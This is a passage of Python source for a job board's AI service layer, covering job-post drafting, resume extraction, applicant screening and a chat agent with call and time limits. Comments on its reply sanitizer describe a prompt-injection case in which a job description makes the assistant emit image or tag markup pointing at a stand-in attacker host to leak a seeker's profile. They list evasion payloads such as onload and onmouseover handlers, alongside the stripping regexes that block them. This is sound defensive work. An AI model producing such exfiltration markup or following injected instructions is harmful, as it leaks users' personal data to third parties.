"""Service layer for AI features. Views translate domain exceptions to HTTP."""
import base64
import html
import logging
import re
import time

from django.core.exceptions import ValidationError  # malformed UUID -> 404, not 500
from django.utils import timezone

from langchain.agents import create_agent
from langchain.agents.middleware import ModelCallLimitMiddleware, wrap_model_call
from langchain.agents.middleware.model_call_limit import ModelCallLimitExceededError
from langchain_core.messages import AIMessage, HumanMessage, trim_messages

from apps.companies.models import Company
from apps.jobs.models import JobPost, JobPostActivity
from apps.seekers.models import SkillSet

from .checkpointer import get_checkpointer
from .exceptions import (
    AgentLimitExceededError,
    AIProviderError,
    AIQuotaExceededError,
    AIResponseInvalidError,
    CompanyProfileMissingError,
    ConversationExhaustedError,
    ConversationNotFoundError,
    InvalidResumeFileError,
    JobPostNotFoundError,
    NoApplicantsError,
    ScreeningPermissionError,
)
from .llm import get_model
from .models import AIUsageLog, Conversation, ScreeningReport
from .prompts import (
    CHAT_SYSTEM,
    build_job_post_writer_prompt,
    build_resume_import_messages,
    build_screening_prompt,
)
from .schemas import JobPostDraft, ResumeExtract, ScreeningResult
from .tools import build_tools

logger = logging.getLogger('apps.ai')


def _classify_provider_error(exc):
    """Quota signals → AIQuotaExceededError; everything else → AIProviderError."""
    code = getattr(exc, 'code', None) or getattr(exc, 'status_code', None)
    text = str(exc)
    if code == 429 or 'RESOURCE_EXHAUSTED' in text or 'quota' in text.lower():
        return AIQuotaExceededError(text)
    return AIProviderError(text)


def _invoke_structured(model, schema, prompt, usage_sink):
    """One structured-output call with exactly one retry.

    Retries transient provider errors and parse failures; quota errors
    raise immediately (retrying spends more quota for nothing).

    Every attempt that returns a result object (including parse
    failures — the raw AIMessage still carries usage_metadata) appends
    {'usage': <usage_metadata dict>, 'latency_ms': <per-attempt int>} to
    usage_sink, so billable spend is recorded even when the call never
    yields a usable draft. Provider exceptions (no result object) append
    nothing — no tokens were confirmed spent.

    Returns the parsed instance.
    """
    structured = model.with_structured_output(
        schema, method='json_schema', include_raw=True)
    last_error = None
    for attempt in range(2):
        started = time.monotonic()
        try:
            result = structured.invoke(prompt)
        except Exception as exc:
            last_error = _classify_provider_error(exc)
            logger.warning('ai provider error attempt=%s cls=%s', attempt,
                           type(exc).__name__)
            if isinstance(last_error, AIQuotaExceededError):
                raise last_error
            continue
        latency_ms = int((time.monotonic() - started) * 1000)
        usage = getattr(result.get('raw'), 'usage_metadata', None) or {}
        usage_sink.append({'usage': usage, 'latency_ms': latency_ms})
        if result.get('parsed') is None:
            last_error = AIResponseInvalidError(str(result.get('parsing_error')))
            logger.warning('ai parse failure attempt=%s', attempt)
            continue
        return result['parsed']
    raise last_error


MAX_RESUME_BYTES = 5 * 1024 * 1024
MAX_SCREENED_APPLICANTS = 50
_COVER_LETTER_CHARS = 500
_EXPERIENCE_DESC_CHARS = 300
# Row caps per dossier section. Seekers create these rows through unrestricted
# viewsets, so without a cap one applicant could pad a dossier to megabytes of
# prompt text — billed to the company and able to blow the run's timeout.
MAX_DOSSIER_EDUCATION = 10
MAX_DOSSIER_EXPERIENCE = 15
MAX_DOSSIER_SKILLS = 30


def _fetch_applications(job_post):
    """Newest-first applications, capped, with every dossier relation preloaded.

    with_related() covers user_account/job_post/company only — the seeker
    relations must be prefetched explicitly or dossier assembly becomes an N+1.
    """
    return list(
        JobPostActivity.objects
        .filter(job_post=job_post)
        .with_related()
        .prefetch_related(
            'user_account__seeker_profile',
            'user_account__education',
            'user_account__experiences',
            'user_account__skills__skill_set',
        )
        .order_by('-application_date')[:MAX_SCREENED_APPLICANTS]
    )


def _seeker_name(user_account):
    """Full name, or '' when the seeker profile is missing.

    Django's reverse-one-to-one DoesNotExist subclasses AttributeError, so
    getattr's default fires instead of raising.
    """
    profile = getattr(user_account, 'seeker_profile', None)
    if profile is None:
        return ''
    return f"{profile.first_name} {profile.last_name}".strip()


def _date_span(start, end):
    if not start and not end:
        return ''
    return f"{start.isoformat() if start else '?'} to {end.isoformat() if end else 'present'}"


def _build_dossier(label, activity):
    """Compact plain-text dossier for one applicant.

    Never includes the applicant's email — name only, per the privacy rule.
    All related sets are read with .all() so the prefetch cache is used, and
    the per-section caps slice the materialized list — slicing the queryset
    instead would issue a fresh LIMIT query and reintroduce the N+1.
    """
    user = activity.user_account
    lines = [f"{label}:", f"Name: {_seeker_name(user) or 'Not provided'}"]

    skills = [f"{s.skill_set.skill_name} ({s.skill_level})"
              for s in list(user.skills.all())[:MAX_DOSSIER_SKILLS]]
    lines.append("Skills: " + (", ".join(skills) or "none listed"))

    for edu in list(user.education.all())[:MAX_DOSSIER_EDUCATION]:
        span = _date_span(edu.start_date, edu.end_date)
        lines.append(
            f"Education: {edu.degree_type or 'Unspecified'} in "
            f"{edu.field_of_study or 'unspecified field'} at "
            f"{edu.institute_university_name or 'unnamed institution'}"
            + (f" ({span})" if span else "")
        )

    for exp in list(user.experiences.all())[:MAX_DOSSIER_EXPERIENCE]:
        span = _date_span(exp.start_date, exp.end_date)
        description = exp.description[:_EXPERIENCE_DESC_CHARS]
        lines.append(
            f"Experience: {exp.position} at {exp.company_name}"
            + (f" ({span})" if span else "")
            + (f" - {description}" if description else "")
        )

    if activity.cover_letter:
        lines.append("Cover letter: " + activity.cover_letter[:_COVER_LETTER_CHARS])

    return "\n".join(lines)


def _record_usage(feature, user, model, usage_sink):
    """One AIUsageLog row per token-consuming attempt (see _invoke_structured)."""
    for entry in usage_sink:
        usage = entry['usage']
        AIUsageLog.objects.create(
            feature=feature,
            user=user,
            model=str(getattr(model, 'model', '')),
            input_tokens=usage.get('input_tokens', 0),
            output_tokens=usage.get('output_tokens', 0),
            latency_ms=entry['latency_ms'],
        )


def generate_job_post_draft(user, *, notes, job_type=None, location_hint='',
                            model=None):
    """Draft a job post from rough notes. Creates nothing but the usage log.

    Returns {'job_title', 'job_description', 'suggested_skills': [
        {'skill_set_id', 'skill_name', 'skill_level', 'is_required'}]}
    with skills mapped to real SkillSet rows; inventions dropped.
    """
    model = model or get_model('flash')
    try:
        company = user.company_profile
    except Company.DoesNotExist:
        raise CompanyProfileMissingError()
    skills = list(SkillSet.objects.order_by('skill_name'))
    prompt = build_job_post_writer_prompt(
        notes=notes,
        company_name=company.company_name,
        business_stream=company.business_stream.business_stream_name,
        job_type_name=job_type.job_type_name if job_type else '',
        location_hint=location_hint,
        skill_names=[s.skill_name for s in skills],
    )

    usage_sink = []
    try:
        draft = _invoke_structured(model, JobPostDraft, prompt, usage_sink)
    finally:
        # One row per attempt that returned a result object — including
        # parse failures — so billable spend is never silently dropped.
        _record_usage(AIUsageLog.Feature.JOB_POST_WRITER, user, model, usage_sink)

    by_name = {s.skill_name.lower(): s for s in skills}
    suggested = []
    for item in draft.suggested_skills:
        skill = by_name.get(item.skill_name.strip().lower())
        if skill is None:
            continue  # invented by the model
        suggested.append({
            'skill_set_id': str(skill.id),
            'skill_name': skill.skill_name,
            'skill_level': item.skill_level,
            'is_required': item.is_required,
        })

    return {
        'job_title': draft.job_title,
        'job_description': draft.job_description,
        'suggested_skills': suggested,
    }


def extract_resume(user, *, text='', file=None, model=None):
    """Extract structured education/experience/skills from a resume.

    Draft-only: persists nothing but usage logs. Returns
    {'education': [...], 'experience': [...],
     'skills': [{'skill_set_id', 'skill_name', 'skill_level'}],
     'new_skill_suggestions': [str]} — entry keys mirror the
    EducationData/ExperienceData models; known skills map to real SkillSet
    rows, unknown ones surface as suggestions instead of being dropped.
    """
    text = (text or '').strip()
    if bool(text) == bool(file):
        raise InvalidResumeFileError('Provide exactly one of text or file.')

    pdf_b64 = None
    if file is not None:
        if file.size > MAX_RESUME_BYTES:
            raise InvalidResumeFileError('PDF must be 5 MB or smaller.')
        header = file.read(5)
        file.seek(0)
        if header != b'%PDF-':
            raise InvalidResumeFileError('File is not a readable PDF.')
        pdf_b64 = base64.b64encode(file.read()).decode('ascii')

    model = model or get_model('flash')
    prompt = build_resume_import_messages(
        resume_text=text or None, pdf_b64=pdf_b64)

    usage_sink = []
    try:
        extract = _invoke_structured(model, ResumeExtract, prompt, usage_sink)
    finally:
        _record_usage(AIUsageLog.Feature.RESUME_IMPORT, user, model, usage_sink)

    by_name = {s.skill_name.lower(): s for s in SkillSet.objects.all()}
    skills, suggestions, seen, seen_suggestions = [], [], set(), set()
    for item in extract.skills:
        name = item.skill_name.strip()
        if not name:
            continue
        skill = by_name.get(name.lower())
        if skill is not None:
            if str(skill.id) in seen:
                continue
            seen.add(str(skill.id))
            skills.append({
                'skill_set_id': str(skill.id),
                'skill_name': skill.skill_name,
                'skill_level': item.skill_level,
            })
        elif name.lower() not in seen_suggestions:
            seen_suggestions.add(name.lower())
            suggestions.append(name)

    education = []
    for entry in extract.education:
        dumped = entry.model_dump()
        # The model's EducationData serializer declares degree_type with
        # blank=True (not null=True) — None fails validation, so coerce the
        # LLM's "null if unclear" to the model's own absent representation
        # before the confirmed draft is POSTed straight to that endpoint.
        if dumped.get('degree_type') is None:
            dumped['degree_type'] = ''
        education.append(dumped)

    return {
        'education': education,
        'experience': [e.model_dump() for e in extract.experience],
        'skills': skills,
        'new_skill_suggestions': suggestions,
    }


def _has_newer_application(job_post, since):
    """Staleness rule: any application newer than the report.

    Deliberately a timestamp comparison, not a count — withdraw-plus-reapply
    leaves the count unchanged and would keep serving a stale report.
    """
    return JobPostActivity.objects.filter(
        job_post=job_post, application_date__gt=since).exists()


def _screening_response(job_post, report, *, cached):
    payload = report.report or {}
    return {
        'job_post_id': str(job_post.id),
        'applicant_count': report.applicant_count,
        'truncated': payload.get('truncated', False),
        'excluded_count': payload.get('excluded_count', 0),
        'generated_at': report.created_at.isoformat(),
        'cached': cached,
        'candidates': payload.get('candidates', []),
    }


def screen_applicants(user, *, job_post_id, refresh=False, model=None):
    """Score and rank a job post's applicants, caching the run.

    Returns the shape documented on the endpoint. Creates nothing but a
    ScreeningReport and its usage log — applications are never mutated.
    """
    try:
        job_post = (JobPost.objects
                    .select_related('company')
                    .prefetch_related('required_skills__skill_set')
                    .get(id=job_post_id))
    except (JobPost.DoesNotExist, ValidationError, ValueError):
        raise JobPostNotFoundError()

    if not (user.is_staff or user.is_superuser):
        if job_post.company.user_account_id != user.id:
            raise ScreeningPermissionError()

    # The report is stamped with the run's start, not its write time: the LLM
    # call can take the better part of a minute, and an application arriving in
    # that window is absent from the report. Stamping it later would judge that
    # application "not newer" forever. Conservative (one extra run at the
    # boundary) beats leaky (the applicant is never screened).
    run_started = timezone.now()

    # Count first, cache second: an emptied pool must 409 rather than replay a
    # report about applications that no longer exist — the one extra COUNT on
    # the cache-hit path is the price.
    total_applicants = JobPostActivity.objects.filter(job_post=job_post).count()
    if total_applicants == 0:
        raise NoApplicantsError()

    latest = (ScreeningReport.objects
              .filter(job_post=job_post).order_by('-created_at').first())
    if latest is not None and not refresh and not _has_newer_application(
            job_post, latest.created_at):
        return _screening_response(job_post, latest, cached=True)

    applications = _fetch_applications(job_post)
    labels = {f"candidate_{i}": activity
              for i, activity in enumerate(applications, start=1)}

    prompt = build_screening_prompt(
        job_title=job_post.job_title,
        job_description=job_post.job_description,
        required_skills=[
            f"{s.skill_set.skill_name} ({s.skill_level}, "
            f"{'required' if s.is_required else 'nice-to-have'})"
            for s in job_post.required_skills.all()
        ],
        dossiers=[_build_dossier(label, activity)
                  for label, activity in labels.items()],
    )

    model = model or get_model('pro')
    usage_sink = []
    try:
        result = _invoke_structured(model, ScreeningResult, prompt, usage_sink)
    finally:
        _record_usage(AIUsageLog.Feature.SCREENING, user, model, usage_sink)

    candidates, seen = [], set()
    for item in result.candidates:
        activity = labels.get(item.candidate_ref.strip())
        if activity is None or activity.id in seen:
            continue  # label the service never issued, or a duplicate
        seen.add(activity.id)
        candidates.append({
            'application_id': str(activity.id),
            'applicant_id': str(activity.user_account_id),
            'applicant_name': _seeker_name(activity.user_account),
            'score': max(0, min(100, item.score)),
            'strengths': list(item.strengths),
            'gaps': list(item.gaps),
            'summary': item.summary,
        })

    # Deterministic ranking — no second LLM call. Name then id break ties so
    # the same inputs always produce the same order.
    candidates.sort(key=lambda c: (-c['score'], c['applicant_name'], c['application_id']))
    for rank, candidate in enumerate(candidates, start=1):
        candidate['rank'] = rank

    logger.info('ai screening job_post=%s screened=%s returned=%s',
                job_post.id, len(applications), len(candidates))

    report = ScreeningReport.objects.create(
        job_post=job_post,
        report={
            'candidates': candidates,
            'truncated': total_applicants > MAX_SCREENED_APPLICANTS,
            # max(0, ...): an application landing between the COUNT and the
            # fetch makes len(applications) the larger of the two.
            'excluded_count': max(0, total_applicants - len(applications)),
        },
        applicant_count=len(applications),
        created_at=run_started,
    )
    return _screening_response(job_post, report, cached=False)


CONVERSATION_TITLE_CHARS = 60
# One turn may legitimately need several model calls (search, then details,
# then an answer). Eight is generous for that and still bounds a runaway loop.
MAX_MODEL_CALLS_PER_TURN = 8
# A whole conversation's ceiling — a single long-lived thread must not become
# an unbounded bill. Cumulative and checkpointed: once reached, the thread is
# finished for good, which is why it maps to its own exception.
MAX_MODEL_CALLS_PER_THREAD = 60
# How many messages the model SEES. Full history stays in the checkpoint.
CHAT_HISTORY_MESSAGES = 20
CHAT_DEADLINE_SECONDS = 90
CHAT_MODEL_TIMEOUT_SECONDS = 60
# A free-form completion has no schema bounding it, unlike the structured
# services — so cap the output explicitly.
CHAT_MAX_OUTPUT_TOKENS = 1024

# Markdown images/links, request-capable raw HTML tags, and bare/www/
# protocol-relative URLs are stripped from the reply. A job description is
# company-authored text that reaches the model, so it can ask the assistant
# to emit ![](https://attacker/?d=<the seeker's profile>) or an equivalent
# raw <img src="//attacker/..."> / entity-encoded / www.-prefixed variant; a
# client rendering that markdown or HTML would beacon the seeker's data to
# the post's author. The system prompt also forbids it — this is the
# enforcement.
#
# _HTML_TAG_RE is a NAME ALLOWLIST, not "any tag": stripping every `<word>`
# corrupts ordinary text that merely looks tag-shaped — `if a<b and b>c`,
# `List<int>`, `std::vector<std::string>`, `const f = (a) => a<10 && a>1;`,
# a reply that discusses `<div>`/`<span>` — none of which can fetch
# anything. Matching is by exact name (IGNORECASE) so "b" never matches the
# "base" alternative, etc.
#
# The name list alone still misses two shapes: (a) tags the list doesn't
# happen to name — `<image>` is parsed as `img` by every HTML5 parser, and
# `<table background=...>`/`<frame src=...>`/`<portal src=...>` are all
# fetch-capable — and (b) EVENT HANDLERS on an otherwise inert tag, e.g.
# `<div onmouseover="fetch(...)">`, where nothing about the tag NAME is
# dangerous. The second alternative below therefore also strips tags whose
# NAME is not on the list, but only in the two shapes a real HTML tag
# actually takes (see _HTML_TAG_RE for exactly which).
#
# BOTH alternatives accept `[\s/]` — not just `\s` — after the tag name.
# HTML5's tokenizer treats "/" inside a tag as an attribute separator, so
# `<img/src=x>` IS `<img src=x>` to every browser (confirmed against
# html.parser: tag='img' attrs=[('src', 'x')]). Requiring whitespace there
# let `<img/src="//host/p?d=...">`, `<svg/onload=...>`, `<div/onmouseover=...>`
# and friends walk straight through both branches.
_DANGEROUS_TAG_NAMES = (
    'img', 'script', 'iframe', 'object', 'embed', 'source', 'video', 'audio',
    'link', 'a', 'form', 'input', 'svg', 'style', 'base', 'meta', 'track',
    'picture', 'image', 'body', 'frame', 'frameset', 'portal', 'button',
    'use',
)
# Attributes that can fetch, navigate, or execute. Used by the unlisted-name
# branch so `<div onmouseover=...>`/`<table background=...>` still die even
# when the assignment is not the tag's FIRST attribute (`<div hidden
# onclick=...>`) or is spaced out (`<div onmouseover = ...>`), both of which
# are legal HTML the first-attribute shape alone would miss. `on[a-zA-Z]{3,}`
# needs >=5 characters total, so ordinary prose words that merely start with
# "on" (`one=1`) can never masquerade as a handler.
_DANGEROUS_ATTR_NAMES = (
    r'on[a-zA-Z]{3,}', 'xlink:href', 'formaction', 'background', 'longdesc',
    'manifest', 'codebase', 'archive', 'srcset', 'usemap', 'poster', 'action',
    'dynsrc', 'lowsrc', 'style', 'href', 'data', 'cite', 'ping', 'src',
)
# The unlisted-name branch used to be `<name\s[^<>]*=[^<>]*/?>` — "any tag
# with an `=` anywhere between the brackets". That over-matched badly, because
# generic DEFAULT PARAMETERS are exactly that shape: `template <typename T =
# int>`, `template<int N = 4>`, `f<T = string>`, `struct Foo<T = u32>` all
# lost their type parameter, and since `[^<>]*` matches newlines, one stray
# `<word ` could swallow an unbounded MULTI-LINE span up to the next `>` if an
# `=` happened to fall in between (`Use a<b for the check\nand set flag=1 when
# done\nso that c>d.` -> `Use ad.`). It is now constrained three ways:
#   * no newlines in the body, so a match can never span lines;
#   * shape 1 — the first attribute carries the `=` IMMEDIATELY, with no
#     space before it (`<div onmouseover=`, `<table background=`). Every
#     generic-default case has ` = ` (spaced) or a non-attribute first token
#     (`<typename T = int>` starts with `T `), so none of them match;
#   * shape 2 — an assignment anywhere in the tag whose attribute NAME is on
#     _DANGEROUS_ATTR_NAMES. `T`/`N`/`z`/`flag` are not, so the fidelity cases
#     stay out; `onmouseover`/`background`/`src` are, so real payloads stay in.
_HTML_TAG_RE = re.compile(
    r'</?(?:' + '|'.join(_DANGEROUS_TAG_NAMES) + r')(?:[\s/][^<>]*)?/?>'
    r'|<[a-zA-Z][a-zA-Z0-9]*[\s/]+'
    r'(?:[^\s<>=/]+=|(?:[^<>\n]*?[\s/])?(?:' +
    '|'.join(_DANGEROUS_ATTR_NAMES) + r')[ \t]*=)[^<>\n]*>',
    re.IGNORECASE)
# A single .sub() pass can leave a dangerous tag half-assembled:
# "<scr<img src=x>ipt>" loses the inner <img ...> tag in one pass, which
# reassembles "<script>" from the surviving "<scr" + "ipt>" fragments —
# invisible to a one-shot substitution because it never re-scans its own
# output. Bounded (real payloads converge in 2-3 passes; this stops a
# pathological input from spinning forever).
_MAX_TAG_STRIP_PASSES = 10
# Fail-closed backstop for when that bound is hit. No name list, no attribute
# shape — every remaining `<...>` goes. See _strip_dangerous_tags.
_ANY_TAG_RE = re.compile(r'<[^<>]*>')
_MD_IMAGE_RE = re.compile(r'!\[[^\]]*\]\([^)]*\)')
_MD_LINK_RE = re.compile(r'\[([^\]]*)\]\([^)]*\)')
# ANY scheme, not an enumerated list: `ws://`, `file://`, `blah://` are just
# as capable of surfacing as a clickable/fetchable URI in a rendering client
# as `https://` is. Run AFTER tag-stripping so a scheme assembled by tag
# removal (`ws:<script>//host</script>` -> `ws://host`) cannot survive.
_BARE_URL_RE = re.compile(r'\b[a-zA-Z][a-zA-Z0-9+.-]*://\S+')
# GitHub-flavoured markdown (and most chat renderers) autolink a bare
# `www.host.tld` even with no scheme and no leading slashes at all.
_WWW_URL_RE = re.compile(r'\bwww\.[\w-]+(?:\.[\w-]+)+(?:[/?#]\S*)?',
                         re.IGNORECASE)
# Scheme-relative (`//host/...`): browsers resolve these against the current
# page scheme, so they fire a cross-origin request exactly like a full URL.
# Requires a DOT-BEARING host after the "//" before deleting anything, so
# ordinary prose ("2024//2025", "and//or", "/usr//local/bin",
# "example.com//page" — none has a dot immediately after "//") survives.
# No restriction on what precedes the "//": that is what lets this also
# catch the tail of an assembled-but-broken scheme URL, e.g. "ws:<b>//host"
# where <b> is not in the tag allowlist and so is never removed. The path
# group excludes the same closing delimiters as the old bare-URL matcher
# (`)`, `]`, `>`, quotes) so a URL parenthesised or quoted in prose doesn't
# swallow its own closing delimiter.
_PROTOCOL_RELATIVE_URL_RE = re.compile(
    r'//[\w-]+(?:\.[\w-]+)+(?:[/?#][^\s)\]>"\']*)?')
# Collapses runs of spaces/tabs, but only mid-line: the lookbehind requires a
# non-whitespace character immediately before the run, so leading indentation
# on a line (fenced code, nested markdown lists) is never touched.
_MULTI_SPACE_RE = re.compile(r'(?<=\S)[ \t]{2,}')


class _ChatDeadlineExceeded(Exception):
    """Internal: wall-clock bound hit between model calls."""


def _strip_dangerous_tags(text):
    """Apply _HTML_TAG_RE to a fixed point instead of once.

    See _MAX_TAG_STRIP_PASSES above: a single pass can remove an inner tag
    and thereby assemble an outer one that was never itself matched.

    The pass bound must FAIL CLOSED. Nesting depth n needs n+1 passes, so
    returning the partially-stripped text once the bound is hit hands the
    client back a live tag: a ~330-character `<i<i<i...<img src="//host/p">
    mg src="//host/p">...>` payload — trivially inside a 1024-token reply and
    fully specifiable from an injected job description — converged at depth 9
    but leaked an intact `<img src="//host/p">` at depth 10. When residue is
    still tag-shaped after the bound, every remaining `<...>` is removed
    instead, with no name or attribute conditions at all. That loop is
    unbounded but provably terminating: it only re-runs when the string
    changed, and _ANY_TAG_RE only ever shortens it. At its fixed point no
    `<...>` without an inner angle bracket exists, so no complete tag of any
    kind can remain.
    """
    for _ in range(_MAX_TAG_STRIP_PASSES):
        stripped = _HTML_TAG_RE.sub('', text)
        if stripped == text:
            return stripped
        text = stripped
    if not _HTML_TAG_RE.search(text):
        return text
    logger.warning('ai chat sanitizer hit the tag-strip pass bound; '
                   'falling back to removing all residual markup')
    while True:
        stripped = _ANY_TAG_RE.sub('', text)
        if stripped == text:
            return stripped
        text = stripped


def _sanitize_reply(text):
    """Drop links/images/raw HTML, keep their visible text. See the regexes above.

    Order matters: entities are decoded first so a scheme cannot be smuggled
    past the URL matchers by encoding a character (e.g. `https&#58;//host`
    decodes to `https://host` before any matcher runs). Dangerous raw HTML
    tags are then stripped to a fixed point as whole units — `<img
    src="...">` or `<a href="...">text</a>` — so a URL hidden in an
    attribute never leaks even though `text` survives, and so a tag or
    scheme split across a stripped tag (`ws:<script>//host</script>`,
    `<scr<img src=x>ipt>`) is fully assembled and re-caught BEFORE the URL
    matchers run, rather than surviving as an unrecognisable fragment. The
    markdown, scheme, www, and protocol-relative URL matchers then handle
    whatever is left in plain markdown or prose form.

    Then it ESCAPES, and that final step — not the stripping — is what makes
    the control sound. Four rounds of review each found another tag shape the
    matchers had to learn (`<image>`, `<div onmouseover=>`, `<scr<img>ipt>`,
    `<img/src=>`, `<div style\n=>`, `<my-el onclick=>`, `<div
    onclick="if(a<b)...">`): a regex will always trail a real HTML5 tokenizer,
    so "enumerate every dangerous shape" is not a control that can be
    finished. `html.escape(..., quote=False)` ends the arms race by principle
    instead of by enumeration — whatever markup survives every matcher above
    reaches the client as `&lt;...&gt;`, i.e. as inert text that cannot fetch,
    navigate, or execute no matter what shape it has.

    The stripping stays in front of it for FIDELITY, not for safety: removing
    attacker markup outright reads better than showing the user a literal
    `<div onmouseover="fetch(...)">`. Escaping must run LAST — the URL
    matchers' delimiter classes are written against raw `>` and `"`.

    Contract note (user-approved): ordinary angle brackets in a reply now
    arrive as entities, so `a<b and b>c` becomes `a&lt;b and b&gt;c`. In a
    markdown/HTML client that RENDERS as `a<b and b>c` — strictly better than
    today, where `<b ...>` is parsed as a live (if inert) bold tag and the
    rest of the line renders bold. A plain-text client shows the entity
    literally, but a plain-text client was never at risk from raw HTML, so the
    cost lands exactly where the control never mattered.

    Escaping last also makes the whole function IDEMPOTENT: the leading
    `html.unescape` undoes the trailing escape, so a reply that is sanitized
    twice equals one sanitized once.
    """
    text = html.unescape(text)
    text = _strip_dangerous_tags(text)
    text = _MD_IMAGE_RE.sub('', text)
    text = _MD_LINK_RE.sub(r'\1', text)
    text = _BARE_URL_RE.sub('', text)
    text = _WWW_URL_RE.sub('', text)
    text = _PROTOCOL_RELATIVE_URL_RE.sub('', text)
    text = _MULTI_SPACE_RE.sub(' ', text).strip()
    # quote=False: "'" and '"' are not markup outside an attribute value, and
    # nothing downstream of here builds an attribute — escaping them would
    # only mangle ordinary prose ("Ada's CV") for no gain.
    return html.escape(text, quote=False)


def _turn_usage(messages):
    """Tokens spent on THIS turn only.

    agent.invoke() returns the entire thread, so summing the whole list
    re-bills every previous turn. Each turn appends exactly one HumanMessage,
    so everything after the last one is this turn's work. This stays correct
    after a failed turn, which still persists its HumanMessage.
    """
    indexes = [i for i, m in enumerate(messages) if isinstance(m, HumanMessage)]
    tail = messages[indexes[-1] + 1:] if indexes else messages
    totals = {'input_tokens': 0, 'output_tokens': 0}
    for message in tail:
        if isinstance(message, AIMessage) and message.usage_metadata:
            totals['input_tokens'] += message.usage_metadata.get('input_tokens', 0)
            totals['output_tokens'] += message.usage_metadata.get('output_tokens', 0)
    return totals


def _stored_messages(checkpointer, config):
    """Messages currently in the thread, or [] if it has none."""
    try:
        snapshot = checkpointer.get_tuple(config)
    except Exception:  # pragma: no cover - bookkeeping must not mask the error
        return []
    if snapshot is None:
        return []
    return snapshot.checkpoint.get('channel_values', {}).get('messages', [])


def _build_chat_agent(model, tools, checkpointer, deadline_at):
    """create_agent with the three bounds this endpoint needs."""

    @wrap_model_call
    def _trim_history(request, handler):
        # Cap what the model SEES, not what is stored. Returning a subset from
        # a @before_model hook would do nothing: the messages channel uses the
        # add_messages reducer, which appends and dedupes by id.
        #
        # trim_messages rather than request.messages[-N:]: a raw slice can open
        # the window on a ToolMessage whose parent AIMessage was cut, and
        # Gemini rejects a functionResponse with no preceding functionCall.
        # start_on='human' guarantees the window opens on a clean turn.
        if len(request.messages) > CHAT_HISTORY_MESSAGES:
            trimmed = trim_messages(
                request.messages,
                max_tokens=CHAT_HISTORY_MESSAGES,
                token_counter=len,
                strategy='last',
                start_on='human',
                include_system=False,
            )
            if not trimmed:
                # A single turn can itself exceed CHAT_HISTORY_MESSAGES: Gemini
                # emits parallel function calls by default, and CHAT_SYSTEM
                # invites multi-tool turns, so one HumanMessage plus its tool
                # calls/results can already be longer than the cap.
                # start_on='human' then finds no HumanMessage inside the
                # trimmed window and returns [] — NOT a fallback to something
                # smaller, an empty list. request.override(messages=[]) would
                # call the model with only the system prompt, and Gemini
                # rejects empty contents with a 400 (-> AIProviderError, i.e.
                # a 502, after several already-billed Pro calls).
                #
                # Fall back to the whole current turn: everything from the
                # last HumanMessage onward. That is guaranteed non-empty,
                # guaranteed to start on a HumanMessage, and — because it
                # never cuts inside the turn — guaranteed not to orphan a
                # ToolMessage. It may exceed CHAT_HISTORY_MESSAGES; that
                # overflow is correct, since a turn cannot be truncated
                # mid-sequence without breaking a tool-call/tool-result pair.
                human_indexes = [i for i, m in enumerate(request.messages)
                                 if isinstance(m, HumanMessage)]
                trimmed = (request.messages[human_indexes[-1]:] if human_indexes
                           else request.messages)
            request = request.override(messages=trimmed)
        return handler(request)

    @wrap_model_call
    def _enforce_deadline(request, handler):
        # Checked between model calls: a turn that keeps calling tools cannot
        # run forever even while every individual call stays under its timeout.
        # Interrupting a blocking call would need threads or signals, neither
        # safe under a WSGI worker.
        if time.monotonic() > deadline_at:
            raise _ChatDeadlineExceeded()
        return handler(request)

    return create_agent(
        model,
        tools=tools,
        system_prompt=CHAT_SYSTEM,
        checkpointer=checkpointer,
        middleware=[
            _enforce_deadline,
            _trim_history,
            # exit_behavior='error' is essential. The default 'end' appends a
            # synthetic AIMessage reading "Model call limits exceeded: run
            # limit (8/8)" — which would be returned to the user as their reply.
            ModelCallLimitMiddleware(
                run_limit=MAX_MODEL_CALLS_PER_TURN,
                thread_limit=MAX_MODEL_CALLS_PER_THREAD,
                exit_behavior='error'),
        ],
    )


def send_chat_message(user, *, message, conversation_id=None, model=None,
                      checkpointer=None):
    """One chat turn. Returns {'conversation_id': str, 'reply': str}.

    Read-only with respect to the domain: the agent's tools cannot write, so
    the only rows this creates are the Conversation and one AIUsageLog.
    """
    created_now = False
    if conversation_id:
        try:
            # Ownership lives in the query, not in a check afterwards — there is
            # no point at which another user's thread has been loaded.
            conversation = Conversation.objects.get(id=conversation_id, user=user)
        except (Conversation.DoesNotExist, ValidationError, ValueError, TypeError):
            raise ConversationNotFoundError()
    else:
        conversation = Conversation.objects.create(
            user=user, title=message[:CONVERSATION_TITLE_CHARS])
        created_now = True

    model = model or get_model('pro', timeout=CHAT_MODEL_TIMEOUT_SECONDS,
                               max_output_tokens=CHAT_MAX_OUTPUT_TOKENS)
    checkpointer = checkpointer or get_checkpointer()
    started = time.monotonic()
    agent = _build_chat_agent(
        model, build_tools(user), checkpointer, started + CHAT_DEADLINE_SECONDS)

    config = {'configurable': {'thread_id': str(conversation.id)}}
    try:
        state = agent.invoke({'messages': [('user', message)]}, config=config)
    except Exception as exc:
        # Tokens were spent before this raised — the run-limit path has made
        # MAX_MODEL_CALLS_PER_TURN billed Pro calls. Read the partial turn back
        # out of the checkpoint and bill it BEFORE any rollback destroys it.
        #
        # Both bookkeeping calls are guarded individually: the database is the
        # correlated failure mode here (every tool queries it), so an
        # exception raised by billing or by rollback must never replace the
        # domain exception below with a raw DB error, and a failure in one
        # must never skip the other.
        try:
            _record_turn_usage(user, model, _stored_messages(checkpointer, config), started)
        except Exception:  # pragma: no cover - bookkeeping must not mask the original error
            # .exception(), not .warning(): a real DB outage here needs a
            # traceback to diagnose, not just a bare message.
            logger.exception('ai chat: failed to record usage for a failed turn '
                             'conversation=%s', conversation.id)
        try:
            _rollback_new_conversation(conversation, checkpointer, created_now)
        except Exception:  # pragma: no cover - bookkeeping must not mask the original error
            logger.exception('ai chat: rollback failed conversation=%s', conversation.id)
        if isinstance(exc, ModelCallLimitExceededError):
            # thread_limit is cumulative and checkpointed: hitting it means the
            # thread can never answer again, which is a different fact about
            # the world than "this turn ran long".
            if exc.thread_limit is not None and exc.thread_count >= exc.thread_limit:
                raise ConversationExhaustedError()
            raise AgentLimitExceededError()
        if isinstance(exc, _ChatDeadlineExceeded):
            raise AgentLimitExceededError()
        raise _classify_provider_error(exc)

    _record_turn_usage(user, model, state['messages'], started)

    # .text, not .content: content is str | list[block] and a Pro/thinking
    # model can return blocks, which would break the declared string contract.
    reply = _sanitize_reply(state['messages'][-1].text) if state['messages'] else ''
    # Ids and sizes only — never the message body (privacy rule).
    logger.info('ai chat conversation=%s messages=%s reply_chars=%s',
                conversation.id, len(state['messages']), len(reply))
    return {'conversation_id': str(conversation.id), 'reply': reply}


def _record_turn_usage(user, model, messages, started):
